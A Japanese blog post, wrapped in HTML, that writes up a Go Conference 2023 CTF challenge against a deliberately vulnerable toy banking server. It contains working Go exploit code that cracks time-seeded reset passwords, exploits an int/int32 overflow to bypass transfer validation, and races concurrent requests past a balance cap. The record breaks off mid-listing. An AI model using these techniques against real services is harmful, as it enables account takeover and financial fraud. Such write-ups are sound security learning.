@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta content="text/html;charset=UTF-8" http-equiv="content-type"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="format-detection" content="telephone=no"/>
+
+    <title>GoCon2023だのCTF Writeupだの - lilyum ensemble</title>
+    <meta itemprop="name" content="GoCon2023だのCTF Writeupだの - lilyum ensemble"/>
+    <meta name="keywords" content="Go,Go Conference,CTF"/>
+    <meta name="thumbnail" content="/pictures/2023/06/02/gocon2023-ctf/thumb.png"/>
+    <meta itemprop="image" content="/pictures/2023/06/02/gocon2023-ctf/thumb.png"/>
+
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:site" content="lilyum ensemble"/>
+    <meta name="twitter:title" content="GoCon2023だのCTF Writeupだの - lilyum ensemble"/>
+    <meta name="twitter:url" content="/2023/06/02/gocon2023-ctf.html"/> 
+    <meta name="twitter:text:description" content="こんにちは､びしょ〜じょです｡パンを作りすぎてゲームする時間がなくなりました｡はじめにさて本日はGo Conference 2023が開催された｡弊社はプラチナスポンサーとして協賛しており､自分..."/>
+    <meta name="twitter:image" content="https://nymphium.github.io/pictures/2023/06/02/gocon2023-ctf/thumb.png"/>
+    <meta name="twitter:image:src" content="https://nymphium.github.io/pictures/2023/06/02/gocon2023-ctf/thumb.png"/>
+
+    <link rel="icon" type="image/x-icon" href="/favicon.ico"/>
+    <link rel="stylesheet" href="/css/main.css"/>
+    <link rel="alternate" type="application/rss+xml" title="lilyum ensemble" href="/feed.xml"/>
+    <link href="https://fonts.googleapis.com/css?family=Comfortaa:300%7CDroid+Sans+Mono%7CCrimson+Text:400,400i" rel="stylesheet"/>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="GoCon2023だのCTF Writeupだの" />
+<meta name="author" content="Satoru Kawahara" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="こんにちは､びしょ〜じょです｡ パンを作りすぎてゲームする時間がなくなりました｡" />
+<meta property="og:description" content="こんにちは､びしょ〜じょです｡ パンを作りすぎてゲームする時間がなくなりました｡" />
+<link rel="canonical" href="https://nymphium.github.io/2023/06/02/gocon2023-ctf.html" />
+<meta property="og:url" content="https://nymphium.github.io/2023/06/02/gocon2023-ctf.html" />
+<meta property="og:site_name" content="lilyum ensemble" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-02T00:00:00+09:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="GoCon2023だのCTF Writeupだの" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Satoru Kawahara"},"dateModified":"2023-06-02T00:00:00+09:00","datePublished":"2023-06-02T00:00:00+09:00","description":"こんにちは､びしょ〜じょです｡ パンを作りすぎてゲームする時間がなくなりました｡","headline":"GoCon2023だのCTF Writeupだの","mainEntityOfPage":{"@type":"WebPage","@id":"https://nymphium.github.io/2023/06/02/gocon2023-ctf.html"},"url":"https://nymphium.github.io/2023/06/02/gocon2023-ctf.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <meta property="og:image" content="/pictures/2023/06/02/gocon2023-ctf/thumb.png"/>
+  </head>
+
+  <body>
+    <header class="site-header">
+      <div class="wrapper" style="font-family: 'Comfortaa';">
+        <a class="site-title" href="/">lilyum ensemble</a>
+        <nav class="site-nav">
+          <div class="trigger">
+            <a class="page-link" href="/about/README.html">About me</a>
+            <a class="page-link" href="/slide.html">Slides</a>
+            <a class="page-link" href="/tags.html">Tags</a>
+          </div>
+        </nav>
+      </div>
+    </header>
+
+    <div class="page-content">
+      <div class="wrapper" lang="ja">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+          <header class="post-header">
+            <div class="post-header-image">
+              <div class="container"><img src="/pictures/2023/06/02/gocon2023-ctf/thumb.png"></div>
+              <div class="post-header-image-margin"></div>
+            </div>
+            <div class="post-header-info">
+              <h1 class="post-title" itemprop="name headline">GoCon2023だのCTF Writeupだの</h1>
+              <span class="post-meta">
+                <time datetime="2023-06-02T00:00:00+09:00" itemprop="datePublished">Jun 2, 2023</time>
+                <a class="src" href="https://github.com/nymphium/nymphium.github.io/blob/source/_posts%2F2023-06-02-gocon2023-ctf.md" target="_blank" rel="noopener noreferrer noopener noreferrer">src</a>
+                <p class="tags">tag: {<span class="tag">
+                    <a href="/tags.html#Go-ref">Go</a>
+                  </span><span></span><span class="tag">
+                    <a href="/tags.html#Go%20Conference-ref">Go Conference</a>
+                  </span><span></span><span class="tag">
+                    <a href="/tags.html#CTF-ref">CTF</a>
+                  </span>}
+                </p>
+                <a class="twitter-share-button" href="https://twitter.com/intent/tweet" target="_blank" rel="noopener noreferrer">Tweet</a> 
+
+                <a href="https://b.hatena.ne.jp/entry/" class="hatena-bookmark-button" data-hatena-bookmark-layout="basic-label" data-hatena-bookmark-lang="ja" title="GoCon2023だのCTF Writeupだの" target="_blank" rel="noopener noreferrer">
+                  <img src="https://b.st-hatena.com/images/v4/public/entry-button/button-only@2x.png" alt="はてなブックマークに追加" width="20" height="20" style="border: none;">
+                </a>
+                <script type="text/javascript" src="https://b.st-hatena.com/js/bookmark_button.js" charset="utf-8" async="async"></script>
+              </span>
+            </div>
+            <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+            <script type="text/javascript" src="/js/GithubRepoWidget.min.js"></script>
+            <script type="text/javascript">setTimeout(GithubRepoWidget.init, 3000);</script>
+
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"></script>
+            <script>
+              document.addEventListener("DOMContentLoaded", function() {
+                renderMathInElement(document.body, {
+                  // customised options
+                  // • auto-render specific keys, e.g.:
+                  delimiters: [
+                                  {left: '$$', right: '$$', display: true},
+                                  {left: '$', right: '$', display: false},
+                                  {left: '\\(', right: '\\)', display: false},
+                                  {left: '\\[', right: '\\]', display: true},
+                                  {left: '\\\\(', right: '\\\\)', display: false},
+                                  {left: '\\\\[', right: '\\\\]', display: true}
+                                ],
+                  // • rendering keys, e.g.:
+                  throwOnError : false
+                });
+              });
+            </script>
+          </header>
+
+          <div class="post-content" itemprop="articleBody">
+<p>こんにちは､びしょ〜じょです｡
+パンを作りすぎてゲームする時間がなくなりました｡</p>
+<h1 id="%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><a class="headerlink" href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB">はじめに</a></h1>
+<p>さて本日は<a href="https://gocon.jp/2023" target="_blank" rel="noopener noreferrer">Go Conference 2023</a>が開催された｡
+弊社はプラチナスポンサーとして協賛しており､自分は一応スタッフ枠で参加したが､セッションを聞いて回ってました｡</p>
+<p>また､弊社はCTFを出題していたのでした｡</p>
+<div class="enclosed-tweet" align="center">
+<blockquote class="twitter-tweet">
+<p lang="ja" dir="ltr">今回もカンムから GoCon CTF (= Capture the Flag) を出題します！Gopher のみなさんなら誰でも楽しめるような内容になっています！<br>お昼休みの暇つぶしとかセッションの合間、はたまたお仕事の気分転換などに！最初にゴールに辿り着くのはあなたです！ <a href="https://twitter.com/hashtag/gocon?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener noreferrer">#gocon</a><br><br>問題はこちら: <a href="https://t.co/C35CXVlTNO" target="_blank" rel="noopener noreferrer">https://t.co/C35CXVlTNO</a></p>— knee (@mururururu) <a href="https://twitter.com/mururururu/status/1664467300865695745?ref_src=twsrc%5Etfw" target="_blank" rel="noopener noreferrer">June 2, 2023</a>
+</blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+</div>
+<div class="github-widget" data-repo="kanmu/gocon-2023-office-hour"></div>
+<p>CTFまともに解けたの初めてでテンションアゲアゲマックなんで､解説していく｡</p>
+<p>出題者によるプロの解説もよければ御覧ください｡</p>
+<div class="twicard">
+  <span class="image"><a href="https://tech.kanmu.co.jp/entry/2023/06/02/173145" target="_blank" rel="noopener noreferrer noopener noreferrer"><div><img src="https://ogimage.blog.st-hatena.com/26006613713383638/820878482933545147/1685694705"></div></a></span>
+  <span class="txt">
+    <div class="title"><a href="https://tech.kanmu.co.jp/entry/2023/06/02/173145" target="_blank" rel="noopener noreferrer noopener noreferrer">Go Conference 2023 CTF: 標準ライブラリの利用ミスに関わる脆弱性 - カンムテックブログ</a></div>
+    <div class="description">セキュリティエンジニアの宮口です。 Go Conference 2023にてCTFの問題を用意させていただきました。 問題はこちらになります。 github.com 本記事では出題の意図、想定解などを解説します。 解けた方も解けなかった方もぜひ読んでみてください！ 1. 問題の解説 今回出題した問題は、バンドルカードの…</div>
+  </span>
+</div>
+<h1 id="Cracking+password"><a class="headerlink" href="#Cracking+password">Cracking password</a></h1>
+<p>Dockerを走らせると､インメモリDB(ただのGoの<code>map</code>)にaliceさんとbobさんの残高が保存される｡</p>
+<p>各人の初期パスワードは､それぞれ<code>time.Now().UnixNano()</code>をseedとして渡した<code>generatePassword</code>により生成されている｡
+一方､<code>resetPassword</code>をみるとseedが<code>time.Now().Unix()</code>になってる!</p>
+<p><code>/password-reset</code>を叩いた時間の秒数まで分かればパスワードが割れるわけですね｡
+ガバガバセキュリティだぜ｡</p>
+<p>初期パスワードのことは忘れて<code>/password-reset</code>を叩いてぶっこ抜く｡</p>
+<div class="highlight">
+<span class="listing-name">exploit.go</span><pre><code class="language-go" data-lang="go"><span class="k">func</span> <span class="n">crackPwd</span><span class="p">(</span><span class="n">u</span> <span class="o">*</span><span class="n">User</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">t</span> <span class="o">:=</span> <span class="n">time</span><span class="o">.</span><span class="n">Now</span><span class="p">()</span><span class="o">.</span><span class="n">Unix</span><span class="p">()</span>
+    <span class="n">passwordReset</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>
+
+    <span class="c">// 秒なんで適当に揺らすガバ実装</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="n">t</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;=</span><span class="n">t</span><span class="o">+</span><span class="m">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">{</span>
+        <span class="n">u</span><span class="o">.</span><span class="n">Password</span> <span class="o">=</span> <span class="n">generatePassword</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="c">// main.goからコピペする</span>
+        <span class="n">r</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">balance</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="s">`{"error": "Authentication failed"}`</span> <span class="p">{</span>
+            <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"%+v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">u</span><span class="p">)</span>
+            <span class="k">return</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="nb">panic</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"could not crack password for user %s"</span><span class="p">,</span> <span class="n">u</span><span class="o">.</span><span class="n">Id</span><span class="p">))</span>
+<span class="p">}</span>
+
+<span class="o">...</span>
+<span class="n">alice</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">User</span><span class="p">{</span><span class="n">Id</span><span class="o">:</span> <span class="s">"alice"</span><span class="p">}</span>
+<span class="n">bob</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">User</span><span class="p">{</span><span class="n">Id</span><span class="o">:</span> <span class="s">"bob"</span><span class="p">}</span>
+<span class="n">crackPwd</span><span class="p">(</span><span class="n">alice</span><span class="p">)</span> <span class="c">// ☑</span>
+<span class="n">crackPwd</span><span class="p">(</span><span class="n">bob</span><span class="p">)</span> <span class="c">// ☑</span>
+</code></pre>
+</div>
+<p>やったぜ｡</p>
+<h1 id="%E6%AE%8B%E9%AB%980%E3%81%8B%E3%82%89%E3%81%AE%E9%80%81%E9%87%91%E3%82%B9%E3%82%AD%E3%83%BC%E3%83%A0"><a class="headerlink" href="#%E6%AE%8B%E9%AB%980%E3%81%8B%E3%82%89%E3%81%AE%E9%80%81%E9%87%91%E3%82%B9%E3%82%AD%E3%83%BC%E3%83%A0">残高0からの送金スキーム</a></h1>
+<p>あとは残高をブチ上げれば良い｡
+しかし…｡</p>
+<div class="highlight"><pre><code class="language-go" data-lang="go"><span class="n">r</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">transfer</span><span class="p">(</span><span class="n">alice</span><span class="p">,</span> <span class="n">bob</span><span class="p">,</span> <span class="s">"10000"</span><span class="p">)</span>
+<span class="nb">println</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+<span class="c">// {"error": "Insufficient balance"}</span>
+</code></pre></div>
+<p>そう､aliceもbobもお金を持っていないのである｡</p>
+<div class="highlight"><pre><code class="language-go" data-lang="go"><span class="n">r</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">transfer</span><span class="p">(</span><span class="n">alice</span><span class="p">,</span> <span class="n">bob</span><span class="p">,</span> <span class="s">"-10000"</span><span class="p">)</span>
+<span class="nb">println</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+<span class="c">// {"error": "Amount validation failed: -10000"}</span>
+</code></pre></div>
+<p>マイナス送金は別の判定らしい｡
+判定部分を見てみましょう｡</p>
+<div class="highlight">
+<span class="listing-name">main.go</span><pre><code class="language-go" data-lang="go"><span class="k">func</span> <span class="n">transfer</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">...</span>
+    <span class="n">amount</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">strconv</span><span class="o">.</span><span class="n">Atoi</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">Amount</span><span class="p">)</span>
+    <span class="o">...</span>
+    <span class="c">// 残高チェック</span>
+    <span class="k">if</span> <span class="kt">int</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">from</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">amount</span> <span class="p">{</span>
+        <span class="o">...</span>
+    <span class="p">}</span>
+
+    <span class="c">// 送金額のバリデーション</span>
+    <span class="k">if</span> <span class="kt">int32</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span> <span class="o">&lt;</span> <span class="m">0</span> <span class="o">||</span> <span class="kt">int32</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span> <span class="o">&gt;</span> <span class="m">1000000</span> <span class="p">{</span>
+        <span class="o">...</span>
+    <span class="p">}</span>
+
+    <span class="c">// 上限チェック</span>
+    <span class="k">if</span> <span class="n">users</span><span class="p">[</span><span class="n">to</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span><span class="o">+</span><span class="kt">int32</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span> <span class="o">&gt;</span> <span class="m">9999999</span> <span class="p">{</span>
+        <span class="o">...</span>
+    <span class="p">}</span>
+
+    <span class="o">...</span>
+    <span class="c">// 残高の移動</span>
+    <span class="n">users</span><span class="p">[</span><span class="n">from</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span> <span class="o">=</span> <span class="n">users</span><span class="p">[</span><span class="n">from</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span> <span class="o">-</span> <span class="kt">int32</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span>
+    <span class="n">users</span><span class="p">[</span><span class="n">to</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span> <span class="o">=</span> <span class="n">users</span><span class="p">[</span><span class="n">to</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span> <span class="o">+</span> <span class="kt">int32</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span>
+
+    <span class="n">w</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"{</span><span class="se">\"</span><span class="s">success</span><span class="se">\"</span><span class="s">: true}"</span><span class="p">))</span> <span class="c">// #nosec G104</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+<p>おいなんか…<code>int</code>と<code>int32</code>が混在してますなが:</p>
+<ol>
+<li>
+<code>UserInfo.Balance</code>は<code>int32</code>
+</li>
+<li>
+<code>amount</code>は<code>int</code>
+</li>
+<li>残高チェックは<code>int</code>
+</li>
+<li>送金額のバリデーションは<code>int32</code>
+</li>
+<li>上限チェックは<code>int32</code>
+</li>
+<li>残高の移動の演算は<code>int32</code>
+</li>
+</ol>
+<p>ここでおもむろにREADMEの注意事項を見てみると､</p>
+<blockquote>
+<p>64bitプラットフォームを対象とした問題です</p>
+</blockquote>
+<p>なるほど｡64bitプラットフォーム上での<code>int</code>は64bitとなる｡</p>
+<p>このことから､先程のマイナス送金は許容されること､リクエストに渡される 送金額のバリデーション､残高の移動が<code>int32</code>上の演算となることを併せて考えると､みんな大好き<strong>オーバーフローでバグらせれば</strong>OKっぽいですね｡</p>
+<p>オフセットを64bitの最小値として､送金したい金額に足してやればマイナス送金で実質的に残高の移動が実現できそう｡</p>
+<div class="highlight">
+<span class="listing-name">バグれバグれバグれ</span><pre><code class="language-go" data-lang="go"><span class="n">offset</span> <span class="o">:=</span> <span class="o">-</span><span class="m">1</span><span class="o">&lt;&lt;</span><span class="m">63</span>
+<span class="n">amount</span> <span class="o">:=</span> <span class="n">offset</span> <span class="o">+</span> <span class="m">10000</span>
+<span class="n">r</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">transfer</span><span class="p">(</span><span class="n">alice</span><span class="p">,</span> <span class="n">bob</span><span class="p">,</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprint</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">amount</span><span class="p">))</span>
+<span class="nb">println</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+<span class="c">// {"success": true}</span>
+
+<span class="n">bobAmount</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">balance</span><span class="p">(</span><span class="n">bob</span><span class="p">)</span>
+<span class="nb">println</span><span class="p">(</span><span class="n">bobAmount</span><span class="p">)</span>
+<span class="c">// {"balance": "10000"} ☑</span>
+
+<span class="n">aliceAmount</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">balance</span><span class="p">(</span><span class="n">alice</span><span class="p">)</span>
+<span class="nb">println</span><span class="p">(</span><span class="n">aliceAmount</span><span class="p">)</span>
+<span class="c">// {"balance": "-10000"}</span>
+</code></pre>
+</div>
+<p>ヨッシャ! aliceはCTFのために借金してくれ!!</p>
+<h1 id="Over+the+boundary"><a class="headerlink" href="#Over+the+boundary">Over the boundary</a></h1>
+<p>さて､あとは送金しまくってフラグが得られる残高9999999を超えればよい｡
+送金額のバリデーションから､1回に送れる最大金額は1000000｡
+したがって､10回送金すればフラグゲット｡</p>
+<div class="highlight"><pre><code class="language-go" data-lang="go"><span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="m">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
+    <span class="n">r</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">transfer</span><span class="p">(</span><span class="n">alice</span><span class="p">,</span> <span class="n">bob</span><span class="p">,</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">amount</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="s">`{"success": true}`</span> <span class="p">{</span>
+        <span class="nb">println</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="nb">panic</span><span class="p">(</span><span class="s">"failed to transfer"</span><span class="p">)</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="c">// {"error": "Balance validation fialed: 1000000"}</span>
+<span class="c">// failed to transfer</span>
+</code></pre></div>
+<p>…のはずだったが､どうやら残高の上限に当たったらしい｡
+なんやねん残高の上限ってこれでは5000兆円手に入っても預けられないやん…とにかく上限判定部分を見直すしかない｡</p>
+<div class="highlight">
+<span class="listing-name">main.go</span><pre><code class="language-go" data-lang="go"><span class="k">func</span> <span class="n">transfer</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">...</span>
+    <span class="c">// 上限チェック</span>
+    <span class="k">if</span> <span class="n">users</span><span class="p">[</span><span class="n">to</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span><span class="o">+</span><span class="kt">int32</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span> <span class="o">&gt;</span> <span class="m">9999999</span> <span class="p">{</span>
+        <span class="n">msg</span> <span class="o">:=</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"{</span><span class="se">\"</span><span class="s">error</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">Balance validation failed: %d</span><span class="se">\"</span><span class="s">}"</span><span class="p">,</span> <span class="kt">int32</span><span class="p">(</span><span class="n">amount</span><span class="p">))</span>
+        <span class="n">http</span><span class="o">.</span><span class="n">Error</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusMethodNotAllowed</span><span class="p">)</span>
+        <span class="k">return</span>
+    <span class="p">}</span>
+    <span class="o">...</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+<p>ファッう〜ん…｡
+送金処理も見てみる｡</p>
+<div class="highlight">
+<span class="listing-name">main.go</span><pre><code class="language-go" data-lang="go">    <span class="c">// 上限チェック</span>
+    <span class="k">if</span> <span class="n">users</span><span class="p">[</span><span class="n">to</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span><span class="o">+</span><span class="kt">int32</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span> <span class="o">&gt;</span> <span class="m">9999999</span> <span class="p">{</span>
+        <span class="o">...</span>
+    <span class="p">}</span>
+
+    <span class="o">...</span>
+
+    <span class="c">// 残高の移動</span>
+    <span class="n">users</span><span class="p">[</span><span class="n">from</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span> <span class="o">=</span> <span class="n">users</span><span class="p">[</span><span class="n">from</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span> <span class="o">-</span> <span class="kt">int32</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span>
+    <span class="n">users</span><span class="p">[</span><span class="n">to</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span> <span class="o">=</span> <span class="n">users</span><span class="p">[</span><span class="n">to</span><span class="p">]</span><span class="o">.</span><span class="n">Balance</span> <span class="o">+</span> <span class="kt">int32</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span>
+
+    <span class="o">...</span>
+</code></pre>
+</div>
+<p>なんかここクサいんだよね､<code>users[to].Balance</code>を変数に束縛してないで毎度参照している｡
+これってつまり…<strong>残高が上限を超える送金額を小分けにして各リクエストの上限判定を通せる</strong>んじゃない?
+いろんなセッションでgoroutineなどの並行並列よもやま話を聞いてきたお陰で脳が活性化しました｡
+上限ギリギリから再スタートするとすぐ上限に当たってしまうので､Dockerを再起動してから回します｡</p>
+<div class="highlight"><pre><code class="language-go" data-lang="go"><span class="n">count</span> <span class="o">:=</span> <span class="m">10</span>
+<span class="n">wg2</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">sync</span><span class="o">.</span><span class="n">WaitGroup</span><span class="p">{}</span>
+<span class="n">wg2</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">count</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
+    <span class="k">go</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">r</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">transfer</span><span class="p">(</span><span class="n">alice</span><span class="p">,</span> <span class="n">bob</span><span class="p">,</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">uf</span><span class="o">+</span><span class="n">soukinMax</span><span class="p">))</span>
+        <span class="nb">println</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="n">wg2</span><span class="o">.</span><span class="n">Done</span><span class="p">()</span>
+    <span class="p">}()</span>
+<span class="p">}</span>
+
+<span class="n">wg2</span><span class="o">.</span><span class="n">Wait</span><span class="p">()</span>
+
+<span class="n">ans</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">balance</span><span class="p">(</span><span class="n">bob</span><span class="p">)</span>
+<span class="nb">println</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
+<span class="c">// {"balance": "10000000", "flag": "kanmu_ctf_2023{https://public.kanmu.jp/gocon2023/congratulations-Y8RYX3gmMZ.html}"}</span>
+</code></pre></div>
+<p><strong><em>ッシャオラア!!!</em></strong> capture the flagじゃい!!!</p>
+<p><a href="https://public.kanmu.jp/gocon2023/congratulations-Y8RYX3gmMZ.html" target="_blank" rel="noopener noreferrer">FlagがURLになっており</a>､図<a href="#omedetou">1</a>のようなウェブページが見られる｡</p>
+<center>
+<label id="omedetou"></label>
+<img src="/pictures//2023/06/02/gocon2023-ctf/ctf.png" alt="">
+図<a href="#omedetou">1</a> おめでとう
+</center>
+<center>
+<label id="baka"></label>
+<div class="enclosed-tweet" align="center">
+<blockquote class="twitter-tweet">
+<p lang="ja" dir="ltr">解けたナリ〜 <a href="https://twitter.com/hashtag/gocon?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener noreferrer">#gocon</a><a href="https://t.co/j3Q3LQQlUt" target="_blank" rel="noopener noreferrer">https://t.co/j3Q3LQQlUt</a></p>— びしょ〜じょ (@Nymphium) <a href="https://twitter.com/Nymphium/status/1664499177492217856?ref_src=twsrc%5Etfw" target="_blank" rel="noopener noreferrer">June 2, 2023</a>
+</blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+</div>
+図<a href="#baka">2</a> Share on Twitterボタンがあるのだが､flagっぽい文字列が出たことに満足してURLを踏む前に満足してツイートした筆者
+</center>
+<hr>
+<p>最後に､全体像を貼っておきます｡</p>
+<div class="highlight">
+<span class="listing-name">explot.go</span><pre><code class="language-go" data-lang="go"><span class="k">func</span> <span class="n">generatePassword</span><span class="p">(</span><span class="n">seed</span> <span class="kt">int64</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+    <span class="c">// 割愛</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">clackPwd</span><span class="p">(</span><span class="n">u</span> <span class="o">*</span><span class="n">User</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">t</span> <span class="o">:=</span> <span class="n">time</span><span class="o">.</span><span class="n">Now</span><span class="p">()</span><span class="o">.</span><span class="n">Unix</span><span class="p">()</span>
+    <span class="n">passwordReset</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="n">t</span> <span class="o">-</span> <span class="m">2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">t</span><span class="o">+</span><span class="m">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
+        <span class="n">u</span><span class="o">.</span><span class="n">Password</span> <span class="o">=</span> <span class="n">generatePassword</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="n">r</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">balance</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="s">`{"error": "Authentication failed"}`</span> <span class="p">{</span>
+            <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"%+v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">u</span><span class="p">)</span>
+            <span class="k">return</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
